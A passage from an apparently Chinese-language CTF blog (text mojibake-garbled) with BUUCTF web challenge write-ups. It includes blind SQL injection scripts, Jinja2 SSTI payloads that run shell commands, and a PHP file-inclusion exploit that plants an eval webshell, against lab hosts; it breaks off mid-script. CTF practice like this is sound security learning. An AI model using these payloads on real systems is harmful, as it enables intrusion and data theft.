</span></span><span class="line"><span class="cl">    <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">high</span> <span class="o">=</span> <span class="mi">132</span>
</span></span><span class="line"><span class="cl">    <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">low</span> <span class="o">&lt;</span> <span class="n">high</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">k</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload_flag</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;Nu1L&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">33</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">lower</span><span class="p">())</span>  <span class="c1"># å› ä¸ºå‡ºæ¥çš„flagæ˜¯å¤§å†™ï¼Œè¿™è¾¹å…¨éƒ¨è½¬ä¸ºå°å†™</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">lower</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ciscn2019-æ€»å†³èµ›-day2-web1easyweb">[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb
</h2><p>æœ‰robots.txtï¼ŒæŸ¥çœ‹image.php.bak</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;config.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">:</span><span class="s2">&#34;1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$path</span><span class="o">=</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span><span class="nx">addslashes</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$path</span><span class="o">=</span><span class="nx">addslashes</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">0&#34;</span><span class="p">,</span><span class="s2">&#34;%00&#34;</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#39;&#34;</span><span class="p">,</span><span class="s2">&#34;&#39;&#34;</span><span class="p">),</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$path</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">0&#34;</span><span class="p">,</span><span class="s2">&#34;%00&#34;</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#39;&#34;</span><span class="p">,</span><span class="s2">&#34;&#39;&#34;</span><span class="p">),</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con</span><span class="p">,</span><span class="s2">&#34;select * from images where id=&#39;</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">&#39; or path=&#39;</span><span class="si">{</span><span class="nv">$path</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$row</span><span class="o">=</span><span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nx">MYSQLI_ASSOC</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$path</span><span class="o">=</span><span class="s2">&#34;./&#34;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Type: image/jpeg&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">readfile</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¦å•å¼•å·å°è¯•æ³¨å…¥ï¼Œè¿™é‡Œçœ‹åˆ°idå…ˆç»è¿‡addslasheså‡½æ•°è½¬ä¹‰ç„¶åå†è¢«str_replaceæ›¿æ¢ä¸ºç©º</p>
<p>æˆ‘ä»¬ç›´æ¥åœ¨idè¿™é‡Œç”¨<code>\\0</code>è¿™æ ·<code>\0</code>ä¼šè¢«è½¬ä¹‰æˆ<code>\\0</code>ï¼Œç„¶ååˆè¢«æ›¿æ¢æˆç©ºï¼Œæœ€åå‰©ä¸ª<code>\</code>æŠŠåé¢çš„å•å¼•å·è½¬ä¹‰</p>
<p>å¯ä»¥çœ‹ç•Œé¢æœ‰æ— <code>JFIF</code>å­—ç¬¦ä¸²åˆ¤æ–­æ˜¯å¦æœ‰å›¾ç‰‡</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">image.php?id=\\0&amp;path=or ascii(substring(database(),%s,1))=%s #
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç›²æ³¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span>  <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://727bcaec-8c37-47b6-8428-161fcbeeeb42.node5.buuoj.cn:81/image.php?id=</span><span class="se">\\</span><span class="s2">0&amp;path=&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34; or ascii(substr((select password from users),</span><span class="si">{}</span><span class="s2">,1))&gt;</span><span class="si">{}</span><span class="s2">%23&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">high</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">    <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span><span class="o">+</span><span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(mid)</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">high</span><span class="o">&gt;</span><span class="n">low</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">mid</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">       <span class="c1"># print(url + payload.format(i,mid))</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;JFIF&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”¨æˆ·åadminï¼Œå¯†ç 84582e71d43b59c72f38</p>
<p>è¿›æ¥æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ </p>
<p>éšä¾¿ä¸Šä¼ å‘ç°ä¸Šä¼ åˆ°æ—¥å¿—å»äº†ï¼Œç›´æ¥æ–‡ä»¶åå†™æœ¨é©¬,æ—¥å¿—æ–‡ä»¶åŒ…å«</p>
<h2 id="rootersctf2019i_3_flask">[RootersCTF2019]I_&lt;3_Flask
</h2><p>è‚¯å®šæ‰“sstiï¼Œçˆ†å‚æ•°</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324193702165.png"
	width="1479"
	height="387"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324193702165_hu293114932105656086.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250324193702165_hu17943763455265594901.png 1024w"
	loading="lazy"
	
		alt="image-20250324193702165"
	
	
		class="gallery-image" 
		data-flex-grow="382"
		data-flex-basis="917px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[182].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls&#34;).read()&#39;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŠ„ä¸€ä¸ªåˆ«äººçš„</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;cat flag.txt&#39;).read()&#34;) }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="npuctf2020ezinclude">[NPUCTF2020]ezinclude
</h2><p>ä¸Šæ¥å…ˆçœ‹æºç </p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324194857838.png"
	width="439"
	height="57"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324194857838_hu7139227941391235662.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250324194857838_hu14322387274611307026.png 1024w"
	loading="lazy"
	
		alt="image-20250324194857838"
	
	
		class="gallery-image" 
		data-flex-grow="770"
		data-flex-basis="1848px"
	
></p>
<p>ç”±äºä¸çŸ¥é“$secretçš„å€¼ï¼Œæˆ‘ä»¬å…ˆä¼ ä¸ªnameçœ‹çœ‹</p>
<p>æŠŠå“åº”çš„hashå¡«å…¥å‘åŒ…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=1&amp;pass=576322dd496b99d07b5b0f7fa7934a25
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ‰ä¸ªflflflflag.php</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324195533675.png"
	width="1839"
	height="633"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324195533675_hu12328814649236684761.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250324195533675_hu272906262207418579.png 1024w"
	loading="lazy"
	
		alt="image-20250324195533675"
	
	
		class="gallery-image" 
		data-flex-grow="290"
		data-flex-basis="697px"
	
></p>
<p>ä¼ªåè®®è¯»æ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?file=php://filter/read=convert.base64-encode/resource=flflflflag.php
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;html&gt;
</span></span><span class="line"><span class="cl">&lt;head&gt;
</span></span><span class="line"><span class="cl">&lt;script language=&#34;javascript&#34; type=&#34;text/javascript&#34;&gt;
</span></span><span class="line"><span class="cl">           window.location.href=&#34;404.html&#34;;
</span></span><span class="line"><span class="cl">&lt;/script&gt;
</span></span><span class="line"><span class="cl">&lt;title&gt;this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend&lt;/title&gt;
</span></span><span class="line"><span class="cl">&lt;/head&gt;
</span></span><span class="line"><span class="cl">&lt;&gt;
</span></span><span class="line"><span class="cl">&lt;body&gt;
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">$file=$_GET[&#39;file&#39;];
</span></span><span class="line"><span class="cl">if(preg_match(&#39;/data|input|zip/is&#39;,$file)){
</span></span><span class="line"><span class="cl">	die(&#39;nonono&#39;);
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">@include($file);
</span></span><span class="line"><span class="cl">echo &#39;include($_GET[&#34;file&#34;])&#39;;
</span></span><span class="line"><span class="cl">?&gt;
</span></span><span class="line"><span class="cl">&lt;/body&gt;
</span></span><span class="line"><span class="cl">&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç›®å½•æ‰«æä¼šå‘ç°dir.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;/tmp&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶å</p>
<h3 id="æ³•ä¸€åˆ©ç”¨php7-segment-faultç‰¹æ€§cve-2018-14884">æ³•ä¸€ï¼šåˆ©ç”¨php7 segment faultç‰¹æ€§ï¼ˆCVE-2018-14884ï¼‰
</h3><p>phpä»£ç ä¸­ä½¿ç”¨php://filterçš„ strip_tags è¿‡æ»¤å™¨, å¯ä»¥è®© php æ‰§è¡Œçš„æ—¶å€™ç›´æ¥å‡ºç° Segment Fault , è¿™æ · php çš„åƒåœ¾å›æ”¶æœºåˆ¶å°±ä¸ä¼šåœ¨ç»§ç»­æ‰§è¡Œ , å¯¼è‡´ POST çš„æ–‡ä»¶ä¼šä¿å­˜åœ¨ç³»ç»Ÿçš„ç¼“å­˜ç›®å½•ä¸‹ä¸ä¼šè¢«æ¸…é™¤è€Œä¸åƒphpinfoé‚£æ ·ä¸Šä¼ çš„æ–‡ä»¶å¾ˆå¿«å°±ä¼šè¢«åˆ é™¤ï¼Œè¿™æ ·çš„æƒ…å†µä¸‹æˆ‘ä»¬åªéœ€è¦çŸ¥é“å…¶æ–‡ä»¶åå°±å¯ä»¥åŒ…å«æˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚</p>
<p>ä½¿ç”¨php://filter/string.strip_tagså¯¼è‡´phpå´©æºƒæ¸…ç©ºå †æ ˆé‡å¯ï¼Œå¦‚æœåœ¨åŒæ—¶ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªtmp fileå°±ä¼šä¸€ç›´ç•™åœ¨tmpç›®å½•ï¼ŒçŸ¥é“æ–‡ä»¶åå°±å¯ä»¥getshellã€‚è¿™ä¸ªå´©æºƒåŸå› æ˜¯å­˜åœ¨ä¸€å¤„ç©ºæŒ‡é’ˆå¼•ç”¨ã€‚å‘PHPå‘é€å«æœ‰æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…æ—¶ï¼Œè®©PHPå¼‚å¸¸å´©æºƒé€€å‡ºï¼ŒPOSTçš„ä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«ä¿ç•™ï¼Œä¸´æ—¶æ–‡ä»¶ä¼šè¢«ä¿å­˜åœ¨upload_tmp_diræ‰€æŒ‡å®šçš„ç›®å½•ä¸‹ï¼Œé»˜è®¤ä¸ºtmpæ–‡ä»¶å¤¹ã€‚</p>
<p>è¯¥æ–¹æ³•ä»…é€‚ç”¨äºä»¥ä¸‹php7ç‰ˆæœ¬ï¼Œphp5å¹¶ä¸å­˜åœ¨è¯¥å´©æºƒã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php7.0.0-7.1.2å¯ä»¥åˆ©ç”¨ï¼Œ 7.1.2xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">php7.1.3-7.2.1å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.1xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">php7.2.2-7.2.8å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.9ä¸€ç›´åˆ°7.3åˆ°ç°åœ¨çš„ç‰ˆæœ¬å·²è¢«ä¿®å¤
</span></span></code></pre></td></tr></table>
</div>
</div><p>åˆ©ç”¨url</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰“è¿™ä¸ªcve</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">BytesIO</span> <span class="c1">#BytesIOå®ç°äº†åœ¨å†…å­˜ä¸­è¯»å†™bytes</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php eval($_POST[cmd]);?&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="n">BytesIO</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">())}</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://60bd763e-32ea-4870-b67e-74f467c3436a.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ ·å°±åœ¨tmpç›®å½•ä¸‹å†™å…¥æœ¨é©¬äº†</p>
<p>æˆ‘ä»¬ç”¨dir.phpæŸ¥çœ‹ä½ç½®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://60bd763e-32ea-4870-b67e-74f467c3436a.node5.buuoj.cn:81/flflflflag.php?file=/tmp/php3r0kqs
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿æ¥ä¸Šç”¨èšå‰‘æ’ä»¶ç»•è¿‡ï¼Œå‘ç°ä¸è¡Œï¼Œbpåœ¨postä¼ å‚cmd=phpinfo()çœ‹çœ‹ï¼Œç›´æ¥æœflagå°±æœ‰äº†</p>
<h3 id="æ³•äºŒåˆ©ç”¨-sessionupload_progress-è¿›è¡Œ-session-æ–‡ä»¶åŒ…å«">æ³•äºŒï¼šåˆ©ç”¨ session.upload_progress è¿›è¡Œ session æ–‡ä»¶åŒ…å«
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;http://60bd763e-32ea-4870-b67e-74f467c3436a.node5.buuoj.cn:81/flflflflag.php&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">sessid</span> <span class="o">=</span> <span class="s1">&#39;yym68686&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">POST</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">host</span><span class="p">,</span>
